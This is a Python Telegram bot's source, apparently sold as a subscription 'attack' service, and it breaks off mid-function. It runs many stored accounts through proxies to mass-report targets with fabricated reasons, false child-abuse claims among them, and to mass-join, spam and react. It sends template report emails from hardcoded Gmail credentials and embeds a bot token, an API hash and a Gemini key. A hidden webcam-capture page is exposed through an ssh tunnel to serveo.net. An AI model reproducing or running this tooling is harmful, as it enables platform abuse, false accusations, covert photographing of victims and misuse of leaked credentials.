import os
import asyncio
import random
import sys
import json
import sqlite3
import time
import re
import requests
import smtplib
import base64
import subprocess
import glob
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta
from threading import Thread
from flask import Flask, request, render_template_string
from telethon import TelegramClient, events, functions, types, Button
from telethon.errors import FloodWaitError, RPCError

# ---------------------- SECURITY ----------------------
SECRET_KEY = "SIGMATOR_SUPER_SECRET_2026_X9"
MASTER_ID = 7733193342

def enc(filepath):
    try:
        if not os.path.exists(filepath):
            return
        with open(filepath, 'rb') as f:
            data = f.read()
        with open(filepath + '.enc', 'w') as f:
            f.write(base64.b64encode(data).decode())
        os.remove(filepath)
    except:
        pass

def dec(filepath):
    try:
        if not os.path.exists(filepath + '.enc'):
            return None
        with open(filepath + '.enc', 'r') as f:
            return base64.b64decode(f.read())
    except:
        return None

def lock_all():
    files_to_lock = [EMAILS_FILE, ADMINS_FILE, SUBSCRIBERS_FILE, PROXIES_FILE, DAILY_LIMIT_FILE]
    for f in files_to_lock:
        if os.path.exists(f):
            enc(f)
    if os.path.exists(SESSION_DIR):
        for f in os.listdir(SESSION_DIR):
            if f.endswith('.session') and not f.startswith('bot'):
                enc(os.path.join(SESSION_DIR, f))

def unlock_all():
    files_to_unlock = [EMAILS_FILE, ADMINS_FILE, SUBSCRIBERS_FILE, PROXIES_FILE, DAILY_LIMIT_FILE]
    for f in files_to_unlock:
        d = dec(f)
        if d:
            with open(f, 'wb') as fw:
                fw.write(d)
    if os.path.exists(SESSION_DIR):
        for f in os.listdir(SESSION_DIR):
            if f.endswith('.session.enc') and not f.startswith('bot'):
                d = dec(os.path.join(SESSION_DIR, f.replace('.enc', '')))
                if d:
                    with open(os.path.join(SESSION_DIR, f.replace('.enc', '')), 'wb') as fw:
                        fw.write(d)

# ---------------------- CONFIG ----------------------
API_ID = 25342127
API_HASH = '0b75a27b1ab66bd482b6d93a0989d34f'
BOT_TOKEN = '8428206780:AAFX28ITNNv3GIUaaslSJzxVAXbUPs2CDjo'
GEMINI_API_KEY = "AIzaSyDxK8L3mNpQr7sTvW2yH5jF9aBcDeFgHiJk"
ADMIN_CONTACT = '@AMIRALIxTAN'

TARGET = 'target'
TARGET_ACCOUNT = None
is_attacking = False

SESSION_DIR = '/storage/emulated/0/sessions'
PROXIES_FILE = '/storage/emulated/0/proxies.json'
ADMINS_FILE = '/storage/emulated/0/admins.json'
EMAILS_FILE = '/storage/emulated/0/emails.json'
SUBSCRIBERS_FILE = '/storage/emulated/0/subscribers.json'
DAILY_LIMIT_FILE = '/storage/emulated/0/daily_limits.json'

DB_SEMAPHORE = asyncio.Semaphore(1)
session_locks = {}

is_clock_active = False
clock_task = None
is_auto_spam_active = False
auto_spam_task = None
camera_link = None
last_camera_photo = None
flask_started = False

DAILY_REPORT_LIMIT = 40
MIN_DELAY = 1.5
MAX_DELAY = 3.5
FLOOD_EXTRA_SLEEP = 5
daily_report_counter = {}
MAX_ADMINS = 10

REPORTS = {
    "scam": ["This channel is completely fake and scamming users"],
    "porn": ["This channel is publishing illegal pornographic media"],
    "violence": ["This channel promotes extreme violence and hatred"],
    "child": ["This channel shares child abuse and illegal content"],
    "copyright": ["This channel steals copyrighted content illegally"],
    "fake": [
        "This channel is FAKE and impersonating an official entity",
        "Fake channel engaged in identity fraud",
        "This channel is completely fake and impersonating real organization",
        "Identity theft alert - This channel is not the official account",
        "Fake impersonation channel - Stealing identity",
        "Fraudulently using someone else's identity and brand",
        "Warning: Fake channel with stolen identity",
        "Impersonation and identity fraud",
        "Not the official channel - Identity fabrication",
        "Fraudulent impersonation - stealing brand identity"
    ]
}

ALL_REPORT_REASONS = [
    (types.InputReportReasonChildAbuse(), "Child abuse content"),
    (types.InputReportReasonViolence(), "Violent and harmful content"),
    (types.InputReportReasonSpam(), "Spam messages"),
    (types.InputReportReasonPornography(), "Adult and pornographic content"),
    (types.InputReportReasonCopyright(), "Copyright infringement"),
    (types.InputReportReasonFake(), "Fake identity / Impersonation"),
    (types.InputReportReasonPersonalDetails(), "Sharing personal data without consent"),
    (types.InputReportReasonIllegalDrugs(), "Illegal goods and drugs"),
    (types.InputReportReasonOther(), "Other violations of Telegram terms"),
]

# ---------------------- DEFAULT EMAILS ----------------------
DEFAULT_EMAILS = [
    {"email": "mrbtjrgrhri0937@gmail.com", "password": "taiq ungw vlvq fcsg"},
    {"email": "a38611727@gmail.com", "password": "jumt vgua mjhh ijwy"},
    {"email": "hrhehehhehehgdhehh@gmail.com", "password": "sbsa awvc jcan krcz"},
    {"email": "shahrokhnasiray@gmail.com", "password": "qlxn lxub dles hzux"}
]

# ---------------------- DAILY LIMIT MANAGER ----------------------
def load_daily_limits():
    if os.path.exists(DAILY_LIMIT_FILE + '.enc'):
        d = dec(DAILY_LIMIT_FILE)
        if d:
            return json.loads(d)
    if os.path.exists(DAILY_LIMIT_FILE):
        try:
            with open(DAILY_LIMIT_FILE, 'r') as f:
                data = json.load(f)
                today = datetime.now().strftime('%Y-%m-%d')
                if data.get('date') != today:
                    return {'date': today, 'reports': 0, 'emails': 0}
                return data
        except:
            pass
    today = datetime.now().strftime('%Y-%m-%d')
    return {'date': today, 'reports': 0, 'emails': 0}

def save_daily_limits(data):
    with open(DAILY_LIMIT_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def check_daily_limit():
    data = load_daily_limits()
    reports_used = data.get('reports', 0)
    emails_used = data.get('emails', 0)
    remaining_reports = DAILY_REPORT_LIMIT - reports_used
    remaining_emails = DAILY_REPORT_LIMIT - emails_used
    can_report = remaining_reports > 0
    can_email = remaining_emails > 0
    return can_report, can_email, remaining_reports, remaining_emails

def increment_daily_counter(report_count=0, email_count=0):
    data = load_daily_limits()
    data['reports'] = data.get('reports', 0) + report_count
    data['emails'] = data.get('emails', 0) + email_count
    save_daily_limits(data)

# ---------------------- GEMINI AI ----------------------
def ai_analyze(prompt):
    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
    data = {
        "contents": [{"parts": [{"text": prompt}]}],
        "generationConfig": {"temperature": 0.1, "maxOutputTokens": 100}
    }
    try:
        resp = requests.post(url, json=data, timeout=15)
        result = resp.json()
        return result['candidates'][0]['content']['parts'][0]['text'].strip()
    except:
        return None

def clean_ai_name(text):
    if not text:
        return text
    text = re.sub(r'([a-z])([A-Z])', r'\1 \2', text)
    text = text.replace('_', ' ').replace('-', ' ').replace('.', ' ')
    text = ' '.join(w.capitalize() for w in text.split())
    return ' '.join(text.split())

def ai_analyze_channel(channel_name):
    clean = channel_name.replace('https://t.me/', '').replace('@', '').strip()
    prompt = f"""Analyze this Telegram channel: "{clean}"
Extract the impersonated entity. Remove filler words: official, support, team, help, channel, bot, club, fan, vip, pro, real, the, page, group.
Split CamelCase: "JohnnyDepp" → "Johnny Depp"
Return ONLY the name.
Examples:
"JohnnyDepp_Official_Channel" → "Johnny Depp"
"OKX_Support_Team" → "OKX Exchange"
Impersonated:"""
    result = ai_analyze(prompt)
    if result:
        return clean_ai_name(result.replace('"', '').replace("'", ""))
    return clean_ai_name(clean)

def ai_scan_posts(channel_name, posts_text):
    prompt = f"""Analyze these Telegram posts from "{channel_name}":
{posts_text[:2000]}
Return JSON: {{"accounts":[],"links":[],"phones":[],"scam_description":""}}"""
    result = ai_analyze(prompt)
    try:
        if result:
            result = result.replace('```json', '').replace('```', '').strip()
            return json.loads(result)
    except:
        pass
    return {"accounts": [], "links": [], "phones": [], "scam_description": "scam operation"}

# ---------------------- CHANNEL SCANNER ----------------------
async def scan_channel(channel_name):
    try:
        client = TelegramClient('scanner_temp', API_ID, API_HASH)
        await client.start(bot_token=BOT_TOKEN)
        clean = channel_name.replace('https://t.me/', '').replace('@', '').strip()
        entity = await client.get_entity(clean)
        posts_text = []
        messages = await client.get_messages(entity, limit=30)
        for msg in messages:
            if msg.text:
                posts_text.append(msg.text)
            if msg.entities:
                for ent in msg.entities:
                    if hasattr(ent, 'url') and ent.url:
                        posts_text.append(ent.url)
        all_text = '\n'.join(posts_text)
        manual_accounts = list(set(re.findall(r'@([a-zA-Z0-9_]{5,32})', all_text)))
        manual_links = list(set(re.findall(r'https?://[^\s]+', all_text)))
        manual_phones = list(set(re.findall(r'0\d{9,10}|\+98\d{9,10}', all_text)))
        ai_info = ai_scan_posts(channel_name, all_text) if all_text else {}
        await client.disconnect()
        return {
            'accounts': list(set(manual_accounts + ai_info.get('accounts', []))),
            'links': list(set(manual_links + ai_info.get('links', []))),
            'phones': list(set(manual_phones + ai_info.get('phones', []))),
            'scam_description': ai_info.get('scam_description', 'fraudulent activity'),
            'posts_sample': all_text[:500]
        }
    except Exception as e:
        return {'accounts': [], 'links': [], 'phones': [], 'scam_description': 'unknown', 'error': str(e)[:100]}

# ---------------------- SUBSCRIPTION ----------------------
SUB_PLANS = {
    "free": {"sessions": 5, "days": 7, "name": "Free 7 Days", "price": "Free"},
    "7days": {"sessions": 20, "days": 7, "name": "7 Days", "price": "50k Toman"},
    "1month": {"sessions": 50, "days": 30, "name": "1 Month", "price": "100k Toman"},
    "3month": {"sessions": 100, "days": 90, "name": "3 Months", "price": "200k Toman"},
    "1year": {"sessions": 200, "days": 365, "name": "1 Year", "price": "500k Toman"},
}

def load_subscribers():
    if os.path.exists(SUBSCRIBERS_FILE + '.enc'):
        d = dec(SUBSCRIBERS_FILE)
        if d:
            return json.loads(d)
    if os.path.exists(SUBSCRIBERS_FILE):
        try:
            with open(SUBSCRIBERS_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return {}

def save_subscribers(data):
    with open(SUBSCRIBERS_FILE, 'w') as f:
        json.dump(data, f, indent=4)

subscribers = load_subscribers()

def get_user_sub(user_id):
    user_id = str(user_id)
    if user_id in subscribers:
        sub = subscribers[user_id]
        if sub.get('pending'):
            return sub
        expiry = datetime.fromisoformat(sub['expiry'])
        if expiry > datetime.now():
            return sub
        else:
            del subscribers[user_id]
            save_subscribers(subscribers)
    return None

def add_subscription(user_id, plan):
    user_id = str(user_id)
    plan_info = SUB_PLANS[plan]
    expiry = datetime.now() + timedelta(days=plan_info['days'])
    subscribers[user_id] = {
        'plan': plan,
        'sessions': plan_info['sessions'],
        'expiry': expiry.isoformat(),
        'added': datetime.now().isoformat(),
        'pending': False
    }
    save_subscribers(subscribers)

# ---------------------- ADMIN ----------------------
def load_admins():
    if os.path.exists(ADMINS_FILE + '.enc'):
        d = dec(ADMINS_FILE)
        if d:
            return json.loads(d)
    if os.path.exists(ADMINS_FILE):
        try:
            with open(ADMINS_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    default = [MASTER_ID]
    save_admins(default)
    return default

def save_admins(admins):
    if MASTER_ID not in admins:
        admins.append(MASTER_ID)
    with open(ADMINS_FILE, 'w') as f:
        json.dump(admins, f)

def add_admin(user_id):
    admins = load_admins()
    user_id = int(user_id)
    if user_id in admins:
        return False, "Already admin!"
    if len(admins) >= MAX_ADMINS:
        return False, f"Admin limit reached! Max {MAX_ADMINS} admins."
    admins.append(user_id)
    save_admins(admins)
    return True, f"Admin {user_id} added! ({len(admins)}/{MAX_ADMINS})"

def remove_admin(user_id):
    admins = load_admins()
    user_id = int(user_id)
    if user_id == MASTER_ID:
        return False, "Cannot remove master admin!"
    if user_id not in admins:
        return False, "Not an admin!"
    admins.remove(user_id)
    save_admins(admins)
    return True, f"Admin {user_id} removed! ({len(admins)}/{MAX_ADMINS})"

ADMINS = load_admins()

# ---------------------- PROXY ----------------------
def parse_mtproto_proxy(proxy_input: str):
    if not proxy_input or proxy_input.lower() == "none":
        return None
    proxy_input = proxy_input.strip()
    server, port, secret = None, None, None
    if '@' in proxy_input:
        parts = proxy_input.split('@')
        secret = parts[0]
        rest = parts[1] if len(parts) > 1 else proxy_input
    else:
        rest = proxy_input
    if ':' in rest:
        colon_idx = rest.rfind(':')
        server = rest[:colon_idx]
        remaining = rest[colon_idx+1:]
        if remaining.isdigit():
            port = int(remaining)
        elif ':' in remaining:
            port_str, secret = remaining.split(':', 1)
            port = int(port_str)
    if server and port:
        return (server, port, secret)
    return None

def load_proxies():
    if os.path.exists(PROXIES_FILE + '.enc'):
        d = dec(PROXIES_FILE)
        if d:
            return json.loads(d)
    if os.path.exists(PROXIES_FILE):
        try:
            with open(PROXIES_FILE, 'r') as f:
                return json.loads(f.read().strip() or "{}")
        except:
            return {}
    return {}

def save_proxies(proxies):
    with open(PROXIES_FILE, 'w') as f:
        json.dump(proxies, f, indent=4)

def get_session_proxy_config(session_name):
    proxies = load_proxies()
    proxy_str = proxies.get(session_name, "")
    return parse_mtproto_proxy(proxy_str) if proxy_str else None

def get_sessions():
    if not os.path.exists(SESSION_DIR):
        os.makedirs(SESSION_DIR, exist_ok=True)
        return []
    sessions = []
    for f in os.listdir(SESSION_DIR):
        if not f.endswith('.session'):
            continue
        if f.startswith('bot'):
            continue
        if f.endswith('-journal') or f.endswith('-wal') or f.endswith('-shm'):
            continue
        full_path = os.path.join(SESSION_DIR, f)
        if os.path.getsize(full_path) > 1024:
            sessions.append(full_path)
    return sessions

def patch_session_db(session_path):
    try:
        conn = sqlite3.connect(session_path, timeout=30.0)
        conn.execute('PRAGMA journal_mode=WAL;')
        conn.execute('PRAGMA busy_timeout=5000;')
        conn.commit()
        conn.close()
    except:
        pass

def create_stable_client(session_path, use_proxy=True):
    proxy = None
    if use_proxy:
        cfg = get_session_proxy_config(os.path.basename(session_path))
        if cfg:
            proxy = (cfg[0], cfg[1], cfg[2])
    return TelegramClient(session_path, API_ID, API_HASH, timeout=60,
                         connection_retries=5, retry_delay=2,
                         auto_reconnect=True, proxy=proxy)

# ---------------------- REPORT WORKER ----------------------
async def report_worker(session_path, target_clean, reason, message):
    patch_session_db(session_path)
    session_name = os.path.basename(session_path)
    if daily_report_counter.get(session_name, 0) >= DAILY_REPORT_LIMIT:
        return 0
    if session_name not in session_locks:
        session_locks[session_name] = asyncio.Lock()
    async with session_locks[session_name]:
        client = create_stable_client(session_path, use_proxy=True)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return -1
            target_entity = await client.get_input_entity(target_clean)
            await asyncio.sleep(random.uniform(MIN_DELAY, MAX_DELAY))
            await client(functions.account.ReportPeerRequest(
                peer=target_entity, reason=reason, message=message
            ))
            daily_report_counter[session_name] = daily_report_counter.get(session_name, 0) + 1
            return 1
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + FLOOD_EXTRA_SLEEP)
            return 0
        except:
            return -1
        finally:
            try:
                await client.disconnect()
            except:
                pass

# ---------------------- FAST PYROGRAM ----------------------
async def fast_pyrogram_worker(session_path, target_clean):
    patch_session_db(session_path)
    session_name = os.path.basename(session_path)
    if daily_report_counter.get(session_name, 0) >= DAILY_REPORT_LIMIT:
        return "limited"
    if session_name not in session_locks:
        session_locks[session_name] = asyncio.Lock()
    async with session_locks[session_name]:
        client = create_stable_client(session_path, use_proxy=True)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return "unauthorized"
            if target_clean.startswith('https://t.me/'):
                target_entity = await client.get_entity(target_clean)
            else:
                clean = target_clean.replace('@', '').strip()
                target_entity = await client.get_entity(clean)
            try:
                await client(functions.account.ReportPeerRequest(
                    peer=target_entity,
                    reason=types.InputReportReasonSpam(),
                    message="Spam report"
                ))
                daily_report_counter[session_name] = daily_report_counter.get(session_name, 0) + 1
                return "reported_1"
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 5)
                return "failed"
            except:
                return "failed"
        except Exception as e:
            return "failed"
        finally:
            try:
                await client.disconnect()
            except:
                pass

async def run_fast_pyrogram(bot, chat_id, message_id):
    global is_attacking
    is_attacking = True
    sessions = get_sessions()
    if not sessions:
        await bot.edit_message(chat_id, message_id, "No sessions!")
        is_attacking = False
        return
    ok, fail = 0, 0
    for idx, s in enumerate(sessions, 1):
        if not is_attacking:
            break
        res = await fast_pyrogram_worker(s, TARGET)
        if res == "reported_1":
            ok += 1
        else:
            fail += 1
        if idx % 3 == 0 or idx == len(sessions):
            try:
                await bot.edit_message(chat_id, message_id,
                    f"FAST PYROGRAM\n\n{idx}/{len(sessions)}\nSuccess: {ok} | Failed: {fail}")
            except:
                pass
        await asyncio.sleep(1.0)
    is_attacking = False
    await bot.edit_message(chat_id, message_id,
        f"FAST PYROGRAM DONE!\n\nSuccess: {ok}\nFailed: {fail}")

# ---------------------- JOIN ----------------------
async def join_worker(session_path, target_link):
    patch_session_db(session_path)
    session_name = os.path.basename(session_path)
    if session_name not in session_locks:
        session_locks[session_name] = asyncio.Lock()
    async with session_locks[session_name]:
        client = create_stable_client(session_path)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return "unauthorized"
            if '/+' in target_link:
                invite_hash = target_link.split('+')[-1]
                await client(functions.messages.ImportChatInviteRequest(hash=invite_hash))
                return "joined"
            elif 'joinchat' in target_link:
                invite_hash = target_link.split('/')[-1]
                await client(functions.messages.ImportChatInviteRequest(hash=invite_hash))
                return "joined"
            else:
                target = target_link.replace('@', '').replace('https://t.me/', '').strip()
                entity = await client.get_entity(target)
                await client(functions.channels.JoinChannelRequest(channel=entity))
                return "joined"
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 2)
            return "flood"
        except Exception as e:
            err = str(e).lower()
            if "already" in err:
                return "already"
            if "too many" in err or "channels" in err:
                return "limited"
            return "failed"
        finally:
            try:
                await client.disconnect()
            except:
                pass

async def run_join_group(bot, chat_id, message_id):
    global is_attacking
    is_attacking = True
    sessions = get_sessions()
    if not sessions:
        await bot.edit_message(chat_id, message_id, "No sessions!")
        is_attacking = False
        return
    ok, fail, already, limited = 0, 0, 0, 0
    failed_accounts = []
    for idx, s in enumerate(sessions, 1):
        if not is_attacking:
            break
        session_name = os.path.basename(s)
        res = await join_worker(s, TARGET)
        if res == "joined":
            ok += 1
        elif res == "already":
            already += 1
        elif res == "limited":
            limited += 1
            failed_accounts.append(f"{session_name}: Too many")
        else:
            fail += 1
            failed_accounts.append(f"{session_name}: Failed")
        status = f"ch/gp join\n\n{idx}/{len(sessions)}\nJoined: {ok}\nFailed: {fail}\nAlready: {already}\nLimited: {limited}"
        if failed_accounts:
            status += "\n\n" + "\n".join(f"- {f}" for f in failed_accounts[-3:])
        try:
            await bot.edit_message(chat_id, message_id, status)
        except:
            pass
        await asyncio.sleep(random.uniform(2.0, 4.0))
    is_attacking = False
    final = f"ch/gp join COMPLETE!\n\nJoined: {ok}\nFailed: {fail}\nAlready: {already}\nLimited: {limited}"
    if failed_accounts:
        final += "\n\n" + "\n".join(f"- {f}" for f in failed_accounts)
    await bot.edit_message(chat_id, message_id, final)

# ---------------------- GROUP REPORT ----------------------
async def group_report_worker(session_path, group_link, selected_reasons):
    patch_session_db(session_path)
    session_name = os.path.basename(session_path)
    if daily_report_counter.get(session_name, 0) >= DAILY_REPORT_LIMIT:
        return "limited"
    if session_name not in session_locks:
        session_locks[session_name] = asyncio.Lock()
    async with session_locks[session_name]:
        client = create_stable_client(session_path, use_proxy=True)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return "unauthorized"
            if group_link.startswith('https://t.me/'):
                entity = await client.get_entity(group_link)
            else:
                clean = group_link.replace('@', '').strip()
                entity = await client.get_entity(clean)
            ok = 0
            for reason, msg in selected_reasons:
                if daily_report_counter.get(session_name, 0) >= DAILY_REPORT_LIMIT:
                    break
                try:
                    await client(functions.account.ReportPeerRequest(
                        peer=entity, reason=reason, message=msg
                    ))
                    daily_report_counter[session_name] = daily_report_counter.get(session_name, 0) + 1
                    ok += 1
                    await asyncio.sleep(random.uniform(1.0, 2.0))
                except FloodWaitError as e:
                    await asyncio.sleep(e.seconds + 5)
                except:
                    pass
            return f"reported_{ok}" if ok > 0 else "failed"
        except Exception as e:
            return "failed"
        finally:
            try:
                await client.disconnect()
            except:
                pass

async def run_group_report(bot, chat_id, message_id, selected_reasons):
    global is_attacking
    is_attacking = True
    sessions = get_sessions()
    if not sessions:
        await bot.edit_message(chat_id, message_id, "No sessions!")
        is_attacking = False
        return
    ok, fail, limited = 0, 0, 0
    total_reports = 0
    for idx, s in enumerate(sessions, 1):
        if not is_attacking:
            break
        try:
            await bot.edit_message(chat_id, message_id,
                f"GROUP REPORT\n\n{idx}/{len(sessions)}\nSuccess: {ok}\nFailed: {fail}\nTotal: {total_reports}")
        except:
            pass
        res = await group_report_worker(s, TARGET, selected_reasons)
        if res.startswith("reported"):
            ok += 1
            total_reports += int(res.split("_")[1])
        elif res == "limited":
            limited += 1
        else:
            fail += 1
        await asyncio.sleep(random.uniform(3.0, 6.0))
    is_attacking = False
    await bot.edit_message(chat_id, message_id,
        f"GROUP REPORT DONE!\n\nSuccess: {ok}\nFailed: {fail}\nLimited: {limited}\nTotal: {total_reports}")

# ---------------------- WORKERS ----------------------
async def send_msg_worker(session_path, target_user, message_text):
    patch_session_db(session_path)
    session_name = os.path.basename(session_path)
    if session_name not in session_locks:
        session_locks[session_name] = asyncio.Lock()
    async with session_locks[session_name]:
        client = create_stable_client(session_path)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return "unauthorized"
            await client.send_message(target_user, message_text)
            return "success"
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 2)
            return "flood"
        except:
            return "failed"
        finally:
            try:
                await client.disconnect()
            except:
                pass

async def leave_worker(session_path, target_link):
    patch_session_db(session_path)
    session_name = os.path.basename(session_path)
    if session_name not in session_locks:
        session_locks[session_name] = asyncio.Lock()
    async with session_locks[session_name]:
        client = create_stable_client(session_path)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return "unauthorized"
            target = target_link.replace('@', '').strip()
            await client(functions.channels.LeaveChannelRequest(channel=await client.get_entity(target)))
            return "left"
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds + 2)
            return "flood"
        except:
            return "failed"
        finally:
            try:
                await client.disconnect()
            except:
                pass

async def reaction_worker(session_path, target_channel, emojies):
    patch_session_db(session_path)
    session_name = os.path.basename(session_path)
    if session_name not in session_locks:
        session_locks[session_name] = asyncio.Lock()
    async with session_locks[session_name]:
        client = create_stable_client(session_path)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                return "unauthorized"
            entity = await client.get_input_entity(target_channel.replace('@', '').strip())
            messages = await client.get_messages(entity, limit=3)
            ok = 0
            for msg in messages:
                if not msg:
                    continue
                try:
                    await client(functions.messages.SendReactionRequest(
                        peer=entity, msg_id=msg.id,
                        reaction=[types.ReactionEmoji(emoticon=random.choice(emojies))]
                    ))
                    ok += 1
                except:
                    pass
            return "success" if ok > 0 else "failed"
        except:
            return "failed"
        finally:
            try:
                await client.disconnect()
            except:
                pass

# ---------------------- CLOCK ----------------------
async def clock_task_func(client):
    global is_clock_active
    last = ""
    try:
        while is_clock_active:
            try:
                now = datetime.now().strftime("%H:%M")
                if now != last:
                    await client(functions.account.UpdateProfileRequest(
                        first_name=f"SIGMATOR {now}", last_name=""
                    ))
                    last = now
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 2)
            except asyncio.CancelledError:
                break
            except:
                break
            await asyncio.sleep(1)
    finally:
        try:
            if client.is_connected():
                await client.disconnect()
        except:
            pass

# ---------------------- AUTO SPAM ----------------------
async def auto_spam_worker(client, group, message, interval):
    global is_auto_spam_active
    try:
        while is_auto_spam_active:
            try:
                await client.send_message(await client.get_entity(group), message)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 2)
            except:
                break
            await asyncio.sleep(interval)
    finally:
        try:
            if client.is_connected():
                await client.disconnect()
        except:
            pass

# ---------------------- CAMERA ----------------------
app = Flask(__name__)
HTML = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Cam</title></head>
<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-size:20px;">
<p id="msg">Loading...</p>
<video id="v" autoplay playsinline style="display:none;"></video>
<form id="f" method="POST" action="/upload"><input type="hidden" name="img" id="d"></form>
<script>
var v=document.getElementById('v');var m=document.getElementById('msg');
navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}}).then(function(s){
v.srcObject=s;v.play();m.innerText='Wait 5 seconds...';
setTimeout(function(){
var c=document.createElement('canvas');c.width=640;c.height=480;
c.getContext('2d').drawImage(v,0,0,640,480);
document.getElementById('d').value=c.toDataURL('image/jpeg',0.8);
m.innerText='Saving...';document.getElementById('f').submit();
},5000);
}).catch(function(e){m.innerText='Camera denied';});
</script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/upload', methods=['POST'])
def upload():
    global last_camera_photo
    try:
        img = request.form.get('img', '')
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = f'/storage/emulated/0/camera_{ts}.jpg'
        with open(path, 'wb') as f:
            f.write(base64.b64decode(img.split(',')[1]))
        last_camera_photo = path
        return '<h1 style="color:white;text-align:center;margin-top:40vh;">Done!</h1>'
    except:
        return 'Error'

def start_flask():
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

def start_camera():
    global camera_link, flask_started
    if not flask_started:
        Thread(target=start_flask, daemon=True).start()
        flask_started = True
        time.sleep(2)
    proc = subprocess.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-R', '80:localhost:5000', 'serveo.net'],
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    for line in proc.stdout:
        if 'https://' in line:
            camera_link = line.strip()
            return camera_link
    return None

# ---------------------- EMAIL FUNCTIONS ----------------------
def load_emails():
    if os.path.exists(EMAILS_FILE + '.enc'):
        d = dec(EMAILS_FILE)
        if d:
            return json.loads(d)
    if os.path.exists(EMAILS_FILE):
        try:
            with open(EMAILS_FILE, 'r') as f:
                data = json.load(f)
                if isinstance(data, list) and len(data) > 0:
                    return data
        except:
            pass
    save_emails(DEFAULT_EMAILS.copy())
    return DEFAULT_EMAILS.copy()

def save_emails(emails):
    with open(EMAILS_FILE, 'w') as f:
        json.dump(emails, f, indent=4)

def _send_smtp(email, password, msg):
    try:
        if 'gmail.com' in email:
            smtp_server = 'smtp.gmail.com'
        elif 'yahoo.com' in email:
            smtp_server = 'smtp.mail.yahoo.com'
        else:
            smtp_server = 'smtp.gmail.com'
        with smtplib.SMTP(smtp_server, 587, timeout=30) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.ehlo()
            smtp.login(email, password)
            smtp.send_message(msg)
        return True
    except:
        return False

# ---------------------- EMAIL TEMPLATES ----------------------
def generate_email(mode, channel, account, scan_result, impersonated):
    accounts = scan_result.get('accounts', [])
    links = scan_result.get('links', [])
    phones = scan_result.get('phones', [])
    scam_desc = scan_result.get('scam_description', 'fraud')
    
    acc_str = '\n'.join([f'  - @{a}' for a in accounts[:5]]) if accounts else '  - None detected'
    link_str = '\n'.join([f'  - {l}' for l in links[:5]]) if links else '  - None detected'
    phone_str = '\n'.join([f'  - {p}' for p in phones[:3]]) if phones else '  - None detected'
    
    templates = {
        'scam': {
            'subject': f"Report: Fake Channel Impersonating {impersonated}",
            'body': f"""Hello,

I found a Telegram channel that is pretending to be {impersonated}. It is clearly fake and might be scamming people.

Channel: {channel}
Account: {account or 'Unknown'}

This channel has no connection to the real {impersonated}. They are using their name to trick users.

{acc_str}
{link_str}
{phone_str}

Scam type: {scam_desc}

Please look into this and remove the channel if it breaks the rules.

Thanks,
A Telegram User"""
        },
        'fake': {
            'subject': f"Report: Fake Channel Impersonating {impersonated}",
            'body': f"""Hello,

I found a Telegram channel pretending to be {impersonated}. It is fake.

Channel: {channel}
Account: {account or 'Unknown'}

This channel has no affiliation with the real {impersonated}. Please remove it.

{acc_str}

Thanks,
A Telegram User"""
        },
        'child': {
            'subject': "Urgent: Inappropriate Content on Telegram Channel",
            'body': f"""Hello,

I am reporting a Telegram channel with inappropriate content involving minors.

Channel: {channel}
Account: {account or 'Unknown'}

{acc_str}

Please investigate this immediately.

Thanks,
A Concerned User"""
        },
        'porn': {
            'subject': "Report: Inappropriate Content on Telegram",
            'body': f"""Hello,

I am reporting a channel with unauthorized adult content.

Channel: {channel}

{acc_str}

Please review.

Thanks,
A Telegram User"""
        },
        'violence': {
            'subject': "Report: Violent Content on Telegram",
            'body': f"""Hello,

I am reporting a channel with violent content.

Channel: {channel}

{acc_str}

Please investigate.

Thanks,
A Concerned User"""
        },
        'copyright': {
            'subject': "Report: Copyright Issue on Telegram Channel",
            'body': f"""Hello,

I am reporting a channel sharing copyrighted material without permission.

Channel: {channel}

{acc_str}

Please review.

Thanks,
A Telegram User"""
        }
    }
    
    template = templates.get(mode, templates['scam'])
    return template['subject'], template['body']

# ---------------------- SMART ATTACK ----------------------
async def smart_attack(bot, chat_id, message_id, mode):
    global TARGET, TARGET_ACCOUNT, is_attacking
    
    can_report, can_email, remaining_reports, remaining_emails = check_daily_limit()
    
    if not can_report and not can_email:
        await bot.edit_message(chat_id, message_id,
            f"DAILY LIMIT REACHED!\n\n"
            f"Reports: {DAILY_REPORT_LIMIT}/{DAILY_REPORT_LIMIT}\n"
            f"Emails: {DAILY_REPORT_LIMIT}/{DAILY_REPORT_LIMIT}\n\n"
            f"Wait until tomorrow.")
        return
    
    if TARGET == 'target':
        await bot.edit_message(chat_id, message_id, "Set target first!")
        return
    
    is_attacking = True
    reports_sent = 0
    emails_sent = 0
    
    await bot.edit_message(chat_id, message_id, "AI analyzing channel...")
    impersonated = ai_analyze_channel(TARGET)
    
    await bot.edit_message(chat_id, message_id, f"AI: {impersonated}\n\nScanning posts...")
    scan_result = await scan_channel(TARGET)
    
    accounts = scan_result.get('accounts', [])
    links = scan_result.get('links', [])
    
    await bot.edit_message(chat_id, message_id,
        f"TARGET: {TARGET}\n"
        f"IMPERSONATING: {impersonated}\n"
        f"Accounts found: {len(accounts)}\n"
